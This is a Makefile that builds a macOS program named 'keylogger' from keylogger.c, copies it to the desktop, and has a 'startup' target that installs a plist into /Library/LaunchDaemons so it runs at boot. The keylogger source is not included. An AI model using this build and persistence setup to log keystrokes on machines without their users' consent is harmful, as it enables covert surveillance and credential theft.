CC=gcc
CFLAGS=-framework ApplicationServices -framework Carbon
SOURCES=keylogger.c
EXECUTABLE=keylogger
PLIST=keylogger.plist
INSTALLDIR=$(HOME)/desktop

all: $(SOURCES)
	echo "BUILDING..."
	$(CC) $(SOURCES) $(CFLAGS) -o $(EXECUTABLE)

install:
	echo "INSTALLING..."
	mkdir -p $(INSTALLDIR)
	cp $(EXECUTABLE) $(INSTALLDIR)

uninstall:
	echo "UNINSTALLING..."
	rm $(INSTALLDIR)/$(EXECUTABLE)
	rm /Library/LaunchDaemons/$(PLIST)

startup:
	cp $(PLIST) /Library/LaunchDaemons

clean:
	echo "CLEANING..."
	rm $(EXECUTABLE)